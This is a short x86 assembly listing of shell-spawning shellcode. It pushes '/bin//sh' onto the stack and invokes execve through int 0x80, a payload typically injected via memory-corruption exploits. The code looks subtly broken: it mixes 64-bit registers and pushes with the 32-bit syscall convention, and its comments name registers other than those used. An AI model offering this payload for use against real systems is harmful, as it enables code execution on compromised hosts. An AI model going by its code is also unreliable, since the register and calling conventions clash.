xor     rax, rax    ;Clearing eax register
push    rax         ;Pushing NULL bytes
push    0x68732f2f  ;Pushing //sh
push    0x6e69622f  ;Pushing /bin
mov     rbx, rsp    ;ebx now contains address of /bin//sh
push    rax         ;Pushing NULL byte
mov     rdx, rsp    ;edx now contains address of NULL byte
push    rbx         ;Pushing address of /bin//sh
mov     rcx, rsp    ;ecx now contains address of address of /bin//sh byte
mov     al, 11      ;syscall number of execve is 11
int     0x80        ;Make the system call
